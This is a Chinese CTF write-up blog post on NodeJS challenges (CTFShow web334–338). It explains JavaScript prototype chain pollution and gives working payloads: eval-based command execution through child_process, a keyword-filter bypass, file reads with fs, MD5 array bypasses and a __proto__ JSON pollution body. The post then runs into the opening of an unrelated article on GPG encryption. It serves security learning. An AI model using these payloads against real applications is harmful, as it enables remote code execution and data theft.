title="原型链定义及如何污染"></a>原型链定义及如何污染</h4><p>原型链的核心就是依赖对象__proto__的指向，当访问的属性在该对象不存在时，就会向上从该对象构造函数的prototype的进行查找，直至查找到Object的原型null为止。</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/20210328093923.png" loading="lazy"></p><blockquote><p>由于对象之间存在继承关系，所以当我们要使用或者输出一个变量就会通过原型链向上搜索，当上层没有就会再向上上层搜索，直到指向 null，若此时还未找到就会返回 undefined</p></blockquote><p>图中的原型链是 cat-&gt;Cat.protype-&gt;Object.prototype-&gt;null<br><img src="https://gitee.com/m0re/picture/raw/master/img/20210328094250.png" loading="lazy"><br>原型链污染就是修改其构造函数中的属性值，使其他通过该构造函数实例化出的对象也具有这个属性的值。<br>由于对象是无序的，当使用第二种方式访问对象时，只能使用指明下标的方式去访问。<br>因此我们可以通过 a [“<strong>proto</strong>“] 的方式去访问其原型对象。<br><img src="https://gitee.com/m0re/picture/raw/master/img/20210328095152.png" loading="lazy"><br>调用对象属性时, 会查找属性，如果本身没有，则会去__proto__中查找，也就是构造函数的显式原型中查找，如果构造函数中也没有该属性，因为构造函数也是对象，也有__proto__，那么会去__proto__的显式原型中查找，一直到null。<br>p神的文章中提到<a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript">JavaScript原型链继承</a></p><h2 id="CTF题目实战"><a href="#CTF题目实战" class="headerlink" title="CTF题目实战"></a>CTF题目实战</h2><h3 id="NodeJS简单类型的题目以及常见绕过"><a href="#NodeJS简单类型的题目以及常见绕过" class="headerlink" title="NodeJS简单类型的题目以及常见绕过"></a>NodeJS简单类型的题目以及常见绕过</h3><p>搜集了一下，做个总结，方便自己以后查阅。前面的题目没有涉及到原型链污染，不过也是学到了许多知识。</p><h4 id="web334"><a href="#web334" class="headerlink" title="web334"></a>web334</h4><p>源码下载下来后，发现user.js和login.js<br>其中user.js中发现了用户名和密码<br>CTFSHOW        123456<br>然后看到login.js中，</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> users <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../modules/user'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>items<span class="token punctuation">;</span> <span class="token keyword">var</span> <span class="token function-variable function">findUser</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> users<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">item</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> name<span class="token operator">!==</span><span class="token string">'CTFSHOW'</span> <span class="token operator">&amp;&amp;</span> item<span class="token punctuation">.</span>username <span class="token operator">===</span> name<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> item<span class="token punctuation">.</span>password <span class="token operator">===</span> password<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">/* GET home page. */</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> flag<span class="token operator">=</span><span class="token string">'flag_here'</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> sess <span class="token operator">=</span> req<span class="token punctuation">.</span>session<span class="token punctuation">;</span>  <span class="token keyword">var</span> user <span class="token operator">=</span> <span class="token function">findUser</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>username<span class="token punctuation">,</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">if</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span><span class="token function">regenerate</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">err</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>ret_code<span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span> ret_msg<span class="token operator">:</span> <span class="token string">'登录失败'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token punctuation">&#125;</span>             req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>loginUser <span class="token operator">=</span> user<span class="token punctuation">.</span>username<span class="token punctuation">;</span>      res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>ret_code<span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span> ret_msg<span class="token operator">:</span> <span class="token string">'登录成功'</span><span class="token punctuation">,</span>ret_flag<span class="token operator">:</span>flag<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>ret_code<span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> ret_msg<span class="token operator">:</span> <span class="token string">'账号或密码错误'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></code></pre><p>其中</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> <span class="token function-variable function">findUser</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> users<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">item</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> name<span class="token operator">!==</span><span class="token string">'CTFSHOW'</span> <span class="token operator">&amp;&amp;</span> item<span class="token punctuation">.</span>username <span class="token operator">===</span> name<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> item<span class="token punctuation">.</span>password <span class="token operator">===</span> password<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><p>CTFSHOW 为name，经过name.toUpperCase()处理后变大写。所以此处如果想让用户名为CTFSHOW，就需要控制输入为ctfshow。<br>所以最后输入用户名为ctfshow 密码为：123456<br>即可登陆成功getflag</p><h4 id="web335"><a href="#web335" class="headerlink" title="web335"></a>web335</h4><p>参考博客 <a href="https://blog.csdn.net/miuzzx/article/details/111780832">https://blog.csdn.net/miuzzx/article/details/111780832</a><br>注释为<code>/eval</code><br><code>eval</code>是为执行命令的关键词，所以这里猜想是可以进行命令执行。<br>所以就去<code>/javascripts/jquery.js</code>中查找<code>eval</code>的语句，但是没get到点。所以看了大师傅的博客，得到了思路。<br><img src="https://gitee.com/m0re/picture/raw/master/img/20210328105647.png" loading="lazy"><br>做的题少就是不行。<br>然后师傅给了两个payload。</p><blockquote><p>require( “child_process” ).spawnSync( ‘ls’, [ ‘/‘ ] ).stdout.toString()<br>require( “child_process” ).spawnSync( ‘cat’, [ ‘f*’ ] ).stdout.toString()</p></blockquote><p>child_process(子进程)<br>该模块提供了衍生子进程（以一种与popen(3)类似但不相同的方式）的能力。此功能主要是由 <code>child_process.spawn()</code>函数提供。<br>此处使用同步进程：三个方法，他们会阻塞NodeJS事件循环、暂停任何其他代码的执行，知道衍生的进程退出。<br><code>child_process.spawnSync()</code>、<code>child_process.execSync()</code> 和 <code>child_process.execFileSync()</code><br>这里学习了两个方法可以用来解答这道题。具体的我将其记录在了NodeJS学习分组文章Day1<br>这里直接进行</p><h5 id="第一种方法"><a href="#第一种方法" class="headerlink" title="第一种方法"></a>第一种方法</h5><p><img src="https://gitee.com/m0re/picture/raw/master/img/20210328105811.png" loading="lazy"><br>然后cat fl00g.txt即可<br><img src="https://gitee.com/m0re/picture/raw/master/img/20210328105837.png" loading="lazy"><br>还有就是上面那个payload了<br>总：</p><blockquote><p>first<br>require( “child_process” ).spawnSync( ‘ls’, [ ‘/‘ ] ).stdout.toString()<br>require( “child_process” ).spawnSync( ‘cat’, [ ‘f*’ ] ).stdout.toString()<br>second<br>require(“child_process”).execSync(‘ls’)<br>require(“child_process”).execSync(‘cat fl00g.txt’)</p></blockquote><h5 id="第二种方法"><a href="#第二种方法" class="headerlink" title="第二种方法"></a>第二种方法</h5><p>参考群里Y4师傅的博客</p><blockquote><p>global.process.mainModule.constructor._load(‘child_process’).exec(‘calc’)</p></blockquote><h4 id="web336"><a href="#web336" class="headerlink" title="web336"></a>web336</h4><blockquote><p>?eval=require(“child_process”).spawnSync(‘ls’).stdout.toString()<br>?eval=require( ‘child_process’ ).spawnSync( ‘cat’, [ ‘fl001g.txt’ ] ).stdout.toString()</p></blockquote><p>直接使用这个就可以，但是，我用另一个方法时，发现了过滤。<br><img src="https://gitee.com/m0re/picture/raw/master/img/20210328110146.png" loading="lazy"><br>这里发现使用335的另外两种方法都不行，然后看Y4师傅的姿势，<br>这里是由好多方法，整理了一下，为方便理解，由易到难来记录。</p><h5 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h5><p>读取文件，通过全局变量读取当前目录位置<br><code>__filename</code><br>然后查找资料看看还有什么其他的全局变量<br><code>__dirname</code> 表示当前执行脚本所在的目录。<br>1、<code>global</code>: nodejs中的顶层对象，相当于前端js的window<br>2、<code>__dirname</code>: 超全局变量/魔术变量，用于获取当前执行文件的所在目录<br>3、<code>__filename</code>: 超全局变量/魔术变量，用于获取当前执行文件的绝对路径<br>查看当前文件的绝对路径。<br><img src="https://gitee.com/m0re/picture/raw/master/img/20210328110311.png" loading="lazy"><br>然后可以看到文件名，然后读取当前目录下的内容。<br>使用<code>fs.readdirSync()</code><br><img src="https://gitee.com/m0re/picture/raw/master/img/20210328110342.png" loading="lazy"><br>发现了fl001g.txt<br>直接读取该文件<br><img src="https://gitee.com/m0re/picture/raw/master/img/20210328110412.png" loading="lazy"></p><h5 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h5><p>然后根据大佬思路，读取该文件的源码，看看是过滤了什么内容。<br><img src="https://gitee.com/m0re/picture/raw/master/img/20210328110449.png" loading="lazy"><br>payload为</p><pre class="language-bash" data-language="bash"><code class="language-bash">?require<span class="token punctuation">(</span><span class="token string">"fs"</span><span class="token punctuation">)</span>.readFileSync<span class="token punctuation">(</span><span class="token string">'/app/routes/index.js'</span>,<span class="token string">'utf-8'</span><span class="token punctuation">)</span></code></pre><p>源码：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/* GET home page. */</span> router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">var</span> evalstring <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>eval<span class="token punctuation">;</span>   <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">typeof</span><span class="token punctuation">(</span>evalstring<span class="token punctuation">)</span><span class="token operator">==</span><span class="token string">'string'</span> <span class="token operator">&amp;&amp;</span> evalstring<span class="token punctuation">.</span><span class="token function">search</span><span class="token punctuation">(</span><span class="token regex">/exec|load/i</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>     res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> title<span class="token operator">:</span> <span class="token string">'tql'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> title<span class="token operator">:</span> <span class="token function">eval</span><span class="token punctuation">(</span>evalstring<span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></code></pre><p>可以看出是在 if(typeof(evalstring)==’string’ &amp;&amp; evalstring.search(/exec|load/i)&gt;0){<br>这里进行过滤，过滤了exec和load，进行编码绕过<br><img src="https://gitee.com/m0re/picture/raw/master/img/20210328110627.png" loading="lazy"><br>在本地测试后发现是可以进行拼接的。<br>在浏览器中，+会被解析成空格，所以要先将+进行编码。</p><pre class="language-bash" data-language="bash"><code class="language-bash">require<span class="token punctuation">(</span><span class="token string">"child_process"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'exe'</span>%2B<span class="token string">'cSync'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span></code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/20210328110732.png" loading="lazy"></p><h5 id="第三种"><a href="#第三种" class="headerlink" title="第三种"></a>第三种</h5><p>直接使用</p><blockquote><p>require( “child_process” ).spawnSync( ‘ls’, [ ‘.’ ] ).stdout.toString()<br>require( “child_process” ).spawnSync( ‘cat’, [ ‘fl00g.txt’ ] ).stdout.toString()</p></blockquote><p>这个方法正好不在过滤范围内。可以直接使用。</p><h4 id="web337"><a href="#web337" class="headerlink" title="web337"></a>web337</h4><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> crypto<span class="token punctuation">.</span><span class="token function">createHash</span><span class="token punctuation">(</span><span class="token string">'md5'</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/* GET home page. */</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> flag<span class="token operator">=</span><span class="token string">'xxxxxxx'</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> a <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>a<span class="token punctuation">;</span>  <span class="token keyword">var</span> b <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>b<span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>a <span class="token operator">&amp;&amp;</span> b <span class="token operator">&amp;&amp;</span> a<span class="token punctuation">.</span>length<span class="token operator">===</span>b<span class="token punctuation">.</span>length <span class="token operator">&amp;&amp;</span> a<span class="token operator">!==</span>b <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span>a<span class="token operator">+</span>flag<span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span>b<span class="token operator">+</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> msg<span class="token operator">:</span> <span class="token string">'tql'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></code></pre><p>这里使用数组绕过MD5比较，还有a和b的长度比较。<br><img src="https://gitee.com/m0re/picture/raw/master/img/20210328110912.png" loading="lazy"><br>最后输出都是<code>[object Object]flag&#123;xxx&#125;</code><br>所以可以使用数组来绕过。<br>paylaod：<code>a[x]=1&amp;b[x]=2</code><br><img src="https://gitee.com/m0re/picture/raw/master/img/20210328110935.png" loading="lazy"></p><h4 id="web338-原型链污染"><a href="#web338-原型链污染" class="headerlink" title="web338(原型链污染)"></a>web338(原型链污染)</h4><p>这个是一道入门题目，源码都给了，在源码中查看，找到了login.js，发现了getflag的关键处。</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">/* GET home page.  */</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> flag<span class="token operator">=</span><span class="token string">'flag_here'</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> secert <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> sess <span class="token operator">=</span> req<span class="token punctuation">.</span>session<span class="token punctuation">;</span>  <span class="token keyword">let</span> user <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  utils<span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span>user<span class="token punctuation">,</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>secert<span class="token punctuation">.</span>ctfshow<span class="token operator">===</span><span class="token string">'36dboy'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>ret_code<span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span> ret_msg<span class="token operator">:</span> <span class="token string">'登录失败'</span><span class="token operator">+</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//copy函数</span><span class="token keyword">function</span> <span class="token function">copy</span><span class="token punctuation">(</span><span class="token parameter">object1<span class="token punctuation">,</span> object2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> object2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token keyword">in</span> object2 <span class="token operator">&amp;&amp;</span> key <span class="token keyword">in</span> object1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">copy</span><span class="token punctuation">(</span>object1<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">,</span> object2<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            object1<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> object2<span class="token punctuation">[</span>key<span class="token punctuation">]</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span></code></pre><p><code>utils.copy(user,req.body);</code>利用这里可实现原型链污染，使得<code>secret</code>继承<code>Object.prototype</code><br><img src="https://gitee.com/m0re/picture/raw/master/img/20210328101958.png" loading="lazy"><br>payload:<code>&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;pass&quot;,&quot;__proto__&quot;:&#123;&quot;ctfshow&quot;:&quot;36dboy&quot;&#125;&#125;</code><br>secret继承了这里的ctfshow的值，所以就刚好使得if语句为true，登录成功。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>因为是从零基础开始学的NodeJS，所以零碎的基础知识有点多。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://wiki.wgpsec.org/knowledge/ctf/js-prototype-chain-pollution.html">https://wiki.wgpsec.org/knowledge/ctf/js-prototype-chain-pollution.html</a><br><a href="https://nikoeurus.github.io/2019/11/30/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">https://nikoeurus.github.io/2019/11/30/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</a><br><a href="https://looaon.com/index.php/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/1110.html">https://looaon.com/index.php/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/1110.html</a><br><a href="https://xz.aliyun.com/t/7182">https://xz.aliyun.com/t/7182</a><br><a href="https://www.kitsch.live/2021/03/14/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">https://www.kitsch.live/2021/03/14/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</a><br><a href="https://www.smi1e.top/javascript-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">https://www.smi1e.top/javascript-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</a><br><a href="http://purplet.top/2020/07/14/javascript%e5%8e%9f%e5%9e%8b%e3%80%81%e5%8e%9f%e5%9e%8b%e9%93%be%e5%8f%8a%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93/">http://purplet.top/2020/07/14/javascript%e5%8e%9f%e5%9e%8b%e3%80%81%e5%8e%9f%e5%9e%8b%e9%93%be%e5%8f%8a%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93/</a><br><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#</a><br><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NodeJS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从一道CTF题目到非对称加密GPG/PGP的学习</title>
      <link href="/posts/6cc4794c/"/>
      <url>/posts/6cc4794c/</url>
      
        <content type="html"><![CDATA[<p><img src="https://p3.ssl.qhimg.com/t01e67ca11e91929df0.png" alt="m0re" loading="lazy"><br>本文首发安全客原创发布<br>安全客 - 有思想的安全新媒体</p><a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>偶尔看到一道CTF题目，**[BSidesSF2019]bWF0cnlvc2hrYQ**，过程中有用到一种加密。那就是GPG，据了解这是一种非对称加密方式。<br>好奇心驱使下，开始搜集学习这个加密方式的学习资料。</p><h1 id="什么是GPG？"><a href="#什么是GPG？" class="headerlink" title="什么是GPG？"></a>什么是GPG？</h1><p>简介：<br>1991年，程序员Phil Zimmermann为了避开政府的监视，开发了加密软件PGP。因为这个软件非常好用，迅速流传开来成为许多程序员的必备工具。但是，它是商业软不能自由使用。所以，自由软件基金会决定，开发一个PGP的替代品取名为GnuPG，因此GPG就诞生了。GPG是GNU Privacy Guard的缩写，是自由软件基金会的GNU计划的一部分。它是一种基于密钥的加密方式，使用了一对密钥对消息进行加密和解密，来保证消息的安全传输。一开始，用户通过数字证书认证软件生成一对公钥和私钥。任何其他想给该用户发送加密消息的用户，需要先从证书机构的公共目录获取接收者的公钥，然后用公钥加密信息，再发送给接收者。当接收者收到加密消息后，他可以用自己的私钥来解密。</p><p>再提一下，非对称加密的定义吧，<strong>公钥用于加密、私钥用于解密。使用公钥加密过的信息只能由配对的私钥解开。这种加密方式叫做非对称加密。</strong><br>简单来说：公钥相当于我们的银行账号，是公开的，别人可以给我们汇钱。<br>私钥相当于银行卡和存折，不能乱放，可以通过这个提我们的钱。<br>非对称加密的过程就是：小A要给小B汇钱，那么小B必须将自己的银行账号(公钥)给公开，然后小A拿到B的公钥后，通过银行给他打了一笔钱，这里的银行就相当于小B的公钥的加密方式，然后小B不是直接拿到这笔钱，而是要使用银行卡(私钥)通过银行将这笔钱取出来。<br>如图所示<br><img src="https://p4.ssl.qhimg.com/t01709ebd2d03d3e28b.png" alt="m0re" loading="lazy"><br>关于对称加密的理解<br>小A给小D写张纸条，上面写着“这个世界上根本就没有奥特曼”但是不希望在传递过程中被别人看到。<br><img src="https://p4.ssl.qhimg.com/t01ffc7faf4ad232908.png" alt="m0re" loading="lazy"><br>但是中间这些传纸条的人比较闲，想看他们的纸条上写了什么。小A于是和小D约定好了，使用密钥3加密她的消息，将字母向下移动3个字母。因此，A将是D，B将是E，等等。如果使用简单的密钥3进行加密，并使用密钥3进行解密，则他们的乱码加密消息很容易破解。有人可以通过尝试所有可能的组合来“强行使用”钥匙。换句话说，他们可以持续猜测，直到获得答案以解密邮件为止。<br><img 